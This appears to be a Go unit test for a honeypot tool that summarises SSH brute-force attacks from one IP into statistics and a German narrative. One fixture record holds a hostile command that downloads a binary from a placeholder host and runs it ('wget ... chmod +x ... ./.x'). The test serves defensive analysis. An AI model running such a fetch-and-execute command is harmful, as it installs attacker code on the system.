package main

import (
	"fmt"
	"strings"
	"testing"
	"time"
)

// Verlauf über alle Angriffe einer IP (Angreiferseite, Konzept "Zusammenfassung zuerst").
func TestBuildHistory(t *testing.T) {
	setHiveZone("Europe/Berlin")
	defer setHiveZone("")
	base := time.Date(2026, 11, 18, 0, 30, 0, 0, time.UTC)
	var list []*Attack
	for i := range 30 {
		first := base.Add(time.Duration(i) * 100 * time.Minute)
		a := &Attack{IP: "203.0.113.45", First: first.UnixMilli(), Last: first.Add(5 * time.Minute).UnixMilli(), Stufe: 1, Profile: "SSH-Brute-Force",
			Counts: map[string]int{"login": 5}, creds: map[string]int{fmt.Sprintf("root / pw%d", i%7): 4, "root / 123456": 1}, Clients: []string{"SSH-2.0-Go"},
			Fingerprints: []string{"HASSH 0a1b2c3d4e5f60718293a4b5c6d7e8f9"}}
		switch i {
		case 13:
			a.Stufe, a.Success, a.SuccessCred, a.Commands = 3, true, "root / 123456", []string{"uname -s -v -n -r -m"}
			a.Tags = []Count{{Key: "recon", Label: "Erkundung"}}
		case 29:
			a.Stufe, a.Success, a.SuccessCred = 3, true, "root / 123456"
			a.Commands = []string{"cd /tmp; wget http://198.51.100.80/x86 -O .x; chmod +x .x; ./.x"}
			a.URLs = []string{"http://198.51.100.80/x86"}
			a.Tags = []Count{{Key: "download", Label: "Nachladen"}}
		}
		list = append(list, a)
	}
	// neueste zuerst wie aus loadAttacks
	for i, j := 0, len(list)-1; i < j; i, j = i+1, j-1 {
		list[i], list[j] = list[j], list[i]
	}
	hs := buildHistory(list, false)
	if hs.Attacks != 30 || hs.Logins != 150 || hs.LoginsOK != 2 || hs.ByStufe[1] != 28 || hs.ByStufe[3] != 2 {
		t.Fatalf("Kennzahlen: %+v", hs)
	}
	if hs.MedianGapMs != (100*time.Minute).Milliseconds() || hs.CredsDistinct != 8 || hs.Days < 3 {
		t.Fatalf("Rhythmus/Kombinationen/Tage: %d %d %d", hs.MedianGapMs, hs.CredsDistinct, hs.Days)
	}
	if len(hs.Points) != 30 || hs.Points[0].T != base.UnixMilli() || hs.Points[29].Commands != 1 {
		t.Fatalf("Punkte: %+v", hs.Points[0])
	}
	if len(hs.Commands) != 2 || !strings.HasPrefix(hs.Commands[0], "uname") {
		t.Fatalf("Befehle in Reihenfolge: %v", hs.Commands)
	}
	story := strings.Join(hs.Story, "\n")
	for _, want := range []string{"30 Angriffe in 2 Tagen, etwa alle 1 Std 40 Min, rund um die Uhr: wirkt wie ein automatischer Bot.",
		"150 Login-Versuche mit 8 verschiedenen Kombinationen; angenommen wurden root / 123456.",
		"2-mal Befehle ausgeführt (2 insgesamt), in dieser Abfolge: Erkundung → Nachladen.",
		"Nachladeversuch von 198.51.100.80.", "Gleicher Client SSH-2.0-Go und gleicher HASSH bei allen Angriffen."} {
		if !strings.Contains(story, want) {
			t.Errorf("fehlt: %q in\n%s", want, story)
		}
	}
	if e := buildHistory(nil, false); e.Attacks != 0 || e.Points == nil || e.Story == nil {
		t.Fatal("leerer Verlauf")
	}
}
